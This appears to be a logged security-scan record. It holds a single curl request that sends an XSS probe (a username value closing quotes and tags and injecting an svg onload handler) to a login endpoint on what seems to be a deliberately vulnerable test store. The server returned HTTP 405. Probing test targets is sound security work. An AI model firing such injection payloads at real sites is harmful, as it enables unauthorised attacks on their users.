@@ -1,0 +1,7 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}\nCTYPE:%{content_type}' -X POST -H 'Content-Type: application/json' -d '{"username": "s5xc876d680\"'"'"'></title></script><svg onload=confirm(1)>"}' https://duck-store.escape.tech/login
+# exit_code: 0
+# ---
+
+
+HTTP_STATUS:405
+CTYPE:
